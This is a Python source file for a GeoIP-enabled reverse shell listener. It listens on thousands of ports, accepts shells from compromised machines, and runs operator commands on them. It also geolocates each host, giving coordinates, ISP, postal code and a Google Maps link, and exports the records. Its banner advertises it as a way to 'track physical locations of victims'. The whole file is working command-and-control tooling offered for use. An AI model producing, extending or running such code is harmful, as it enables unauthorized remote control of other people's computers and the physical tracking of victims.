#!/usr/bin/env python3
import socket
import threading
import sys
import time
import json
import os
import signal
from datetime import datetime
import geoip2.database
import geoip2.errors
import requests

# Try to import readline for better CLI (Unix-like systems)
try:
    import readline
    READLINE_AVAILABLE = True
except ImportError:
    READLINE_AVAILABLE = False
    # For Windows, we'll still work without tab completion

# ==================== ANSI COLORS ====================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

# ==================== GEOIP MANAGER ====================
class GeoIPManager:
    def __init__(self):
        self.db_reader = None
        self.db_path = None
        self.load_database()
    
    def load_database(self):
        """Try to load GeoLite2 database from common locations"""
        possible_paths = [
            './GeoLite2-City.mmdb',
            './GeoLite2-Country.mmdb',
            '/usr/share/GeoIP/GeoLite2-City.mmdb',
            '/usr/local/share/GeoIP/GeoLite2-City.mmdb',
            os.path.expanduser('~/.local/share/GeoIP/GeoLite2-City.mmdb')
        ]
        
        # Also check Windows paths
        if sys.platform == 'win32':
            possible_paths.extend([
                'C:\\GeoIP\\GeoLite2-City.mmdb',
                os.path.expanduser('~\\AppData\\Local\\GeoIP\\GeoLite2-City.mmdb')
            ])
        
        for path in possible_paths:
            try:
                if os.path.exists(path):
                    self.db_reader = geoip2.database.Reader(path)
                    self.db_path = path
                    print(f"{Colors.GREEN}✓ Loaded GeoIP2 database from: {path}{Colors.END}")
                    return
            except:
                continue
        
        print(f"{Colors.YELLOW}⚠ No GeoIP2 database found. Will use fallback HTTP API.{Colors.END}")
    
    def get_location(self, ip):
        """Get location info using geoip2 database or fallback API"""
        location = {
            'country': 'Unknown',
            'region': 'Unknown',
            'city': 'Unknown',
            'latitude': None,
            'longitude': None,
            'postal_code': None,
            'timezone': None,
            'isp': 'Unknown',
            'source': None
        }
        
        # Try local database first
        if self.db_reader:
            try:
                response = self.db_reader.city(ip)
                location.update({
                    'country': response.country.name or 'Unknown',
                    'region': response.subdivisions.most_specific.name if response.subdivisions else 'Unknown',
                    'city': response.city.name or 'Unknown',
                    'latitude': response.location.latitude,
                    'longitude': response.location.longitude,
                    'postal_code': response.postal.code,
                    'timezone': response.location.time_zone,
                    'source': 'GeoIP2 Database'
                })
                return location
            except geoip2.errors.AddressNotFoundError:
                pass
            except Exception as e:
                print(f"{Colors.YELLOW}⚠ GeoIP2 database error: {e}{Colors.END}")
        
        # Fallback to HTTP API
        try:
            response = requests.get(f'http://ip-api.com/json/{ip}', timeout=3)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    location.update({
                        'country': data.get('country', 'Unknown'),
                        'region': data.get('regionName', 'Unknown'),
                        'city': data.get('city', 'Unknown'),
                        'latitude': data.get('lat'),
                        'longitude': data.get('lon'),
                        'isp': data.get('isp', 'Unknown'),
                        'timezone': data.get('timezone', 'Unknown'),
                        'source': 'ip-api.com'
                    })
        except:
            pass
        
        return location

# ==================== DEVICE CLASS ====================
class Device:
    def __init__(self, device_id, ip, port, socket, geoip_manager):
        self.id = device_id
        self.ip = ip
        self.port = port
        self.socket = socket
        self.first_seen = datetime.now()
        self.last_seen = datetime.now()
        self.active = True
        self.reconnections = 0
        self.os = self.detect_os()
        self.hostname = self.get_hostname()
        self.commands = []
        self.notes = ""
        self.geoip = geoip_manager
        self.location = self.geoip.get_location(ip)
    
    def get_hostname(self):
        try:
            return socket.gethostbyaddr(self.ip)[0]
        except:
            return "Unknown"
    
    def detect_os(self):
        """Detect operating system"""
        try:
            self.socket.settimeout(2)
            self.socket.send(b'uname -a\n')
            time.sleep(0.5)
            response = self.socket.recv(1024).decode()
            if 'Linux' in response:
                return 'Linux'
            elif 'Darwin' in response:
                return 'macOS'
            
            self.socket.send(b'ver\n')
            time.sleep(0.5)
            response = self.socket.recv(1024).decode()
            if 'Windows' in response:
                return 'Windows'
        except:
            pass
        return 'Unknown'
    
    def get_location_string(self):
        if self.location['city'] != 'Unknown':
            return f"{self.location['city']}, {self.location['region']}, {self.location['country']}"
        elif self.location['country'] != 'Unknown':
            return self.location['country']
        return "Location Unknown"
    
    def get_coordinates(self):
        if self.location['latitude'] and self.location['longitude']:
            return f"{self.location['latitude']:.4f}, {self.location['longitude']:.4f}"
        return "Unknown"
    
    def get_map_link(self):
        if self.location['latitude'] and self.location['longitude']:
            return f"https://www.google.com/maps?q={self.location['latitude']},{self.location['longitude']}"
        return None

# ==================== MAIN LISTENER CLASS ====================
class ReverseShellListener:
    def __init__(self, start_port=60000, end_port=65535):
        self.start_port = start_port
        self.end_port = end_port
        self.devices = {}
        self.next_id = 1
        self.current_id = None
        self.lock = threading.Lock()
        self.running = True
        self.geoip = GeoIPManager()
    
    def add_device(self, ip, port, client_socket):
        with self.lock:
            # Check for existing device
            for device in self.devices.values():
                if device.ip == ip and device.active:
                    device.reconnections += 1
                    device.last_seen = datetime.now()
                    device.socket = client_socket
                    return device.id
            
            # New device
            device_id = self.next_id
            self.next_id += 1
            self.devices[device_id] = Device(device_id, ip, port, client_socket, self.geoip)
            
            # Print location info
            device = self.devices[device_id]
            print(f"\n{Colors.GREEN}📍 NEW DEVICE CONNECTED!{Colors.END}")
            print(f"{Colors.BOLD}{'═'*60}{Colors.END}")
            print(f"  ID:       {device_id}")
            print(f"  IP:       {device.ip}")
            print(f"  Port:     {device.port}")
            print(f"  OS:       {device.os}")
            print(f"  Hostname: {device.hostname}")
            print(f"  Location: {device.get_location_string()}")
            print(f"  Coordinates: {device.get_coordinates()}")
            if device.location.get('postal_code'):
                print(f"  Postal:   {device.location['postal_code']}")
            if device.location.get('isp', 'Unknown') != 'Unknown':
                print(f"  ISP:      {device.location['isp']}")
            if device.location.get('timezone'):
                print(f"  Timezone: {device.location['timezone']}")
            if device.get_map_link():
                print(f"  Map:      {device.get_map_link()}")
            print(f"  Source:   {device.location['source']}")
            print(f"{Colors.BOLD}{'═'*60}{Colors.END}")
            print(f"  Type 'list' to see all devices")
            print(f"  Type 'use {device_id}' to interact\n")
            
            return device_id
    
    def remove_device(self, device_id):
        with self.lock:
            if device_id in self.devices:
                self.devices[device_id].active = False
                self.devices[device_id].socket = None
                if self.current_id == device_id:
                    self.current_id = None
                print(f"{Colors.YELLOW}[-] Device {device_id} disconnected{Colors.END}")
    
    def list_devices(self):
        if not self.devices:
            return f"{Colors.YELLOW}No devices connected yet{Colors.END}"
        
        result = f"\n{Colors.BOLD}{'═'*110}{Colors.END}\n"
        result += f"{Colors.BOLD}{'ID':<4} {'IP':<16} {'Location':<40} {'OS':<10} {'Status':<10} {'Last Seen'}{Colors.END}\n"
        result += f"{Colors.BOLD}{'═'*110}{Colors.END}\n"
        
        for device in self.devices.values():
            marker = f"{Colors.GREEN}→{Colors.END} " if self.current_id == device.id else "  "
            status = f"{Colors.GREEN}● ACTIVE{Colors.END}" if device.active else f"{Colors.RED}○ OFFLINE{Colors.END}"
            
            location = device.get_location_string()
            if len(location) > 39:
                location = location[:36] + "..."
            
            last_seen = device.last_seen.strftime('%H:%M:%S')
            
            result += f"{marker}{device.id:<2} {device.ip:<16} {location:<40} {device.os:<10} {status:<10} {last_seen}\n"
        
        result += f"{Colors.BOLD}{'═'*110}{Colors.END}\n"
        active = len([d for d in self.devices.values() if d.active])
        result += f"Total: {len(self.devices)} devices ({active} active)\n"
        result += f"GeoIP Source: {self.geoip.db_path or 'HTTP API'}\n"
        
        return result
    
    def show_device_details(self, device_id):
        if device_id not in self.devices:
            return f"{Colors.RED}Device {device_id} not found{Colors.END}"
        
        d = self.devices[device_id]
        
        result = f"\n{Colors.BOLD}📋 DEVICE DETAILS - ID: {device_id}{Colors.END}\n"
        result += f"{'═'*60}\n"
        result += f"{Colors.BOLD}Network Information:{Colors.END}\n"
        result += f"  IP Address:     {d.ip}\n"
        result += f"  Port:           {d.port}\n"
        result += f"  Hostname:       {d.hostname}\n"
        result += f"  OS:             {d.os}\n"
        result += f"\n{Colors.BOLD}📍 Location Information:{Colors.END}\n"
        result += f"  Country:        {d.location['country']}\n"
        result += f"  Region:         {d.location['region']}\n"
        result += f"  City:           {d.location['city']}\n"
        result += f"  Coordinates:    {d.get_coordinates()}\n"
        if d.location.get('postal_code'):
            result += f"  Postal Code:    {d.location['postal_code']}\n"
        if d.get_map_link():
            result += f"  Map:            {d.get_map_link()}\n"
        if d.location.get('isp', 'Unknown') != 'Unknown':
            result += f"  ISP:            {d.location['isp']}\n"
        if d.location.get('timezone'):
            result += f"  Timezone:       {d.location['timezone']}\n"
        result += f"  Data Source:    {d.location['source']}\n"
        result += f"\n{Colors.BOLD}⏱️  Timeline:{Colors.END}\n"
        result += f"  First Seen:     {d.first_seen.strftime('%Y-%m-%d %H:%M:%S')}\n"
        result += f"  Last Seen:      {d.last_seen.strftime('%H:%M:%S')}\n"
        result += f"  Reconnections:  {d.reconnections}\n"
        result += f"  Commands Run:   {len(d.commands)}\n"
        if d.notes:
            result += f"\n{Colors.BOLD}📝 Notes:{Colors.END}\n  {d.notes}\n"
        result += f"{'═'*60}\n"
        
        return result
    
    def export_devices(self, filename="devices.json"):
        data = []
        for device in self.devices.values():
            data.append({
                'id': device.id,
                'ip': device.ip,
                'port': device.port,
                'hostname': device.hostname,
                'os': device.os,
                'first_seen': device.first_seen.isoformat(),
                'last_seen': device.last_seen.isoformat(),
                'reconnections': device.reconnections,
                'location': device.location,
                'notes': device.notes,
                'commands': device.commands
            })
        
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        print(f"{Colors.GREEN}✓ Exported {len(data)} devices to {filename}{Colors.END}")
    
    def handle_device_session(self, client_socket, addr, port):
        device_id = self.add_device(addr[0], port, client_socket)
        
        try:
            while self.running:
                if self.current_id == device_id:
                    device = self.devices[device_id]
                    location = device.get_location_string()
                    
                    prompt = f"\n{Colors.CYAN}device[{device_id}:{addr[0]} - {location}]>{Colors.END} "
                    
                    # Handle input differently based on platform
                    if sys.platform == 'win32':
                        # Simple input for Windows (no readline)
                        cmd = input(prompt)
                    else:
                        # For Unix-like systems, we can use readline if available
                        try:
                            if READLINE_AVAILABLE:
                                # Simple input - readline works automatically
                                cmd = input(prompt)
                            else:
                                cmd = input(prompt)
                        except:
                            cmd = input(prompt)
                    
                    if cmd.lower() == 'back':
                        self.current_id = None
                        print(f"{Colors.YELLOW}Returned to main menu{Colors.END}")
                        continue
                    
                    elif cmd.lower() == 'exit':
                        client_socket.send(b'exit\n')
                        break
                    
                    elif cmd.lower() == 'info':
                        print(self.show_device_details(device_id))
                    
                    elif cmd.lower() == 'map':
                        link = device.get_map_link()
                        if link:
                            print(f"{Colors.GREEN}📍 Google Maps: {link}{Colors.END}")
                        else:
                            print(f"{Colors.RED}No coordinates available{Colors.END}")
                    
                    elif cmd.startswith('note '):
                        device.notes = cmd[5:]
                        print(f"{Colors.GREEN}Note saved{Colors.END}")
                    
                    elif cmd.lower() == 'clear':
                        if sys.platform == 'win32':
                            os.system('cls')
                        else:
                            os.system('clear')
                    
                    elif cmd.lower() == 'help':
                        print(f"""
{Colors.BOLD}Device Commands:{Colors.END}
  back        - Return to main menu
  info        - Show device details
  map         - Show Google Maps link
  note <text> - Add a note about this device
  clear       - Clear screen
  exit        - Close connection
  <command>   - Execute command on device
                        """)
                    
                    else:
                        try:
                            client_socket.send(cmd.encode() + b'\n')
                            device.commands.append(cmd)
                            device.last_seen = datetime.now()
                            
                            response = client_socket.recv(8192)
                            if response:
                                print(response.decode(), end='')
                        except:
                            print(f"{Colors.RED}Connection lost{Colors.END}")
                            break
                else:
                    time.sleep(1)
                    
        except Exception as e:
            print(f"{Colors.RED}Error with device {device_id}: {e}{Colors.END}")
        finally:
            self.remove_device(device_id)
            client_socket.close()
    
    def start_listener(self):
        print(f"\n{Colors.BOLD}{Colors.GREEN}╔══════════════════════════════════════════════════════════╗{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}║     🌍 GEOIP2 REVERSE SHELL LISTENER                      ║{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}║         Track physical locations of victims                ║{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}╚══════════════════════════════════════════════════════════╝{Colors.END}")
        print(f"\n{Colors.BOLD}Configuration:{Colors.END}")
        print(f"  Port Range: {self.start_port} - {self.end_port}")
        print(f"  Total Ports: {self.end_port - self.start_port + 1}")
        print(f"  Python Version: {sys.version.split()[0]}")
        print(f"  Platform: {sys.platform}")
        print(f"  GeoIP2 Database: {self.geoip.db_path or 'Not found (using HTTP API)'}")
        if READLINE_AVAILABLE:
            print(f"  Tab Completion: Available")
        else:
            print(f"  Tab Completion: Not available on this platform")
        print(f"  Type '{Colors.CYAN}help{Colors.END}' for commands\n")
        
        for port in range(self.start_port, self.end_port + 1):
            def listen_port(p):
                try:
                    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    server.bind(('0.0.0.0', p))
                    server.listen(5)
                    
                    while self.running:
                        try:
                            client, addr = server.accept()
                            thread = threading.Thread(
                                target=self.handle_device_session,
                                args=(client, addr, p)
                            )
                            thread.daemon = True
                            thread.start()
                        except:
                            pass
                except:
                    pass
            
            t = threading.Thread(target=listen_port, args=(port,))
            t.daemon = True
            t.start()
            
            if port % 1000 == 0:
                print(f"  Listening on ports up to {port}")
        
        print(f"\n{Colors.GREEN}✓ Listening on all ports{Colors.END}")
        print(f"{Colors.YELLOW}Waiting for connections...{Colors.END}\n")
        
        self.command_loop()
    
    def command_loop(self):
        while self.running:
            try:
                cmd = input(f"{Colors.PURPLE}listener>{Colors.END} ").strip().lower()
                
                if cmd in ['exit', 'quit']:
                    self.running = False
                    print(f"{Colors.YELLOW}Shutting down...{Colors.END}")
                    break
                
                elif cmd in ['help', '?']:
                    self.show_help()
                
                elif cmd in ['list', 'devices', 'ls']:
                    print(self.list_devices())
                
                elif cmd == 'geoip':
                    print(f"\n{Colors.BOLD}GeoIP Information:{Colors.END}")
                    print(f"  Database: {self.geoip.db_path or 'Not found'}")
                    print(f"  Fallback: HTTP API (ip-api.com)")
                
                elif cmd.startswith('use '):
                    target = cmd[4:].strip()
                    success = False
                    
                    if target.isdigit():
                        device_id = int(target)
                        if device_id in self.devices and self.devices[device_id].active:
                            self.current_id = device_id
                            device = self.devices[device_id]
                            print(f"{Colors.GREEN}✓ Switched to device {device_id} ({device.ip} - {device.get_location_string()}){Colors.END}")
                            print(f"  Type 'help' for device commands, 'back' to return")
                            success = True
                    
                    if not success:
                        for device in self.devices.values():
                            if device.ip == target and device.active:
                                self.current_id = device.id
                                print(f"{Colors.GREEN}✓ Switched to device {device.id} ({device.ip} - {device.get_location_string()}){Colors.END}")
                                print(f"  Type 'help' for device commands, 'back' to return")
                                success = True
                                break
                    
                    if not success:
                        print(f"{Colors.RED}✗ Device '{target}' not found or inactive{Colors.END}")
                
                elif cmd.startswith('info '):
                    try:
                        device_id = int(cmd[5:].strip())
                        print(self.show_device_details(device_id))
                    except:
                        print(f"{Colors.RED}Usage: info <device_id>{Colors.END}")
                
                elif cmd.startswith('map '):
                    try:
                        device_id = int(cmd[4:].strip())
                        if device_id in self.devices:
                            link = self.devices[device_id].get_map_link()
                            if link:
                                print(f"{Colors.GREEN}📍 Google Maps: {link}{Colors.END}")
                            else:
                                print(f"{Colors.RED}No coordinates for device {device_id}{Colors.END}")
                        else:
                            print(f"{Colors.RED}Device {device_id} not found{Colors.END}")
                    except:
                        print(f"{Colors.RED}Usage: map <device_id>{Colors.END}")
                
                elif cmd.startswith('export'):
                    parts = cmd.split()
                    filename = parts[1] if len(parts) > 1 else "devices.json"
                    self.export_devices(filename)
                
                elif cmd == 'stats':
                    active = len([d for d in self.devices.values() if d.active])
                    total = len(self.devices)
                    
                    countries = {}
                    for d in self.devices.values():
                        country = d.location['country']
                        countries[country] = countries.get(country, 0) + 1
                    
                    print(f"\n{Colors.BOLD}Statistics:{Colors.END}")
                    print(f"  Active devices: {active}")
                    print(f"  Total devices:  {total}")
                    print(f"  Current device: {self.current_id or 'None'}")
                    print(f"\n{Colors.BOLD}Geographic Distribution:{Colors.END}")
                    for country, count in sorted(countries.items(), key=lambda x: x[1], reverse=True):
                        if country != 'Unknown':
                            print(f"  {country}: {count}")
                    if 'Unknown' in countries:
                        print(f"  Unknown: {countries['Unknown']}")
                    print("")
                
                elif cmd == 'clear':
                    if sys.platform == 'win32':
                        os.system('cls')
                    else:
                        os.system('clear')
                
                elif cmd == '':
                    continue
                
                else:
                    print(f"{Colors.RED}Unknown command: {cmd}{Colors.END}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}Use 'exit' to quit{Colors.END}")
            except Exception as e:
                print(f"{Colors.RED}Error: {e}{Colors.END}")
    
    def show_help(self):
        print(f"""
{Colors.BOLD}╔══════════════════════════════════════════════════════════╗
║                     MAIN COMMANDS                          ║
╠════════════════════════════════════════════════════════════╣{Colors.END}
  {Colors.GREEN}list, devices, ls{Colors.END}    - Show all connected devices with location
  {Colors.GREEN}use <id or IP>{Colors.END}       - Switch to a specific device
  {Colors.GREEN}info <id>{Colors.END}            - Show detailed device information
  {Colors.GREEN}map <id>{Colors.END}             - Show Google Maps link for device
  {Colors.GREEN}export [filename]{Colors.END}    - Export device data to JSON
  {Colors.GREEN}stats{Colors.END}                 - Show statistics with geographic distribution
  {Colors.GREEN}geoip{Colors.END}                 - Show GeoIP database status
  {Colors.GREEN}clear{Colors.END}                 - Clear the screen
  {Colors.GREEN}help, ?{Colors.END}               - Show this help
  {Colors.GREEN}exit, quit{Colors.END}            - Shutdown listener

{Colors.BOLD}╔══════════════════════════════════════════════════════════╗
║                  DEVICE COMMANDS                           ║
╠════════════════════════════════════════════════════════════╣{Colors.END}
  When connected to a device (use <id>), you can run:
  
  {Colors.GREEN}back{Colors.END}                   - Return to main menu
  {Colors.GREEN}info{Colors.END}                   - Show detailed device info
  {Colors.GREEN}map{Colors.END}                    - Show Google Maps link
  {Colors.GREEN}note <text>{Colors.END}             - Add a note about this device
  {Colors.GREEN}clear{Colors.END}                   - Clear the screen
  {Colors.GREEN}exit{Colors.END}                    - Close device connection
  {Colors.GREEN}<command>{Colors.END}                - Execute any command on the device
        """)

# ==================== MAIN ====================
if __name__ == "__main__":
    listener = ReverseShellListener(60000, 65535)
    
    def signal_handler(sig, frame):
        print(f"\n{Colors.YELLOW}Shutting down...{Colors.END}")
        listener.running = False
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    listener.start_listener()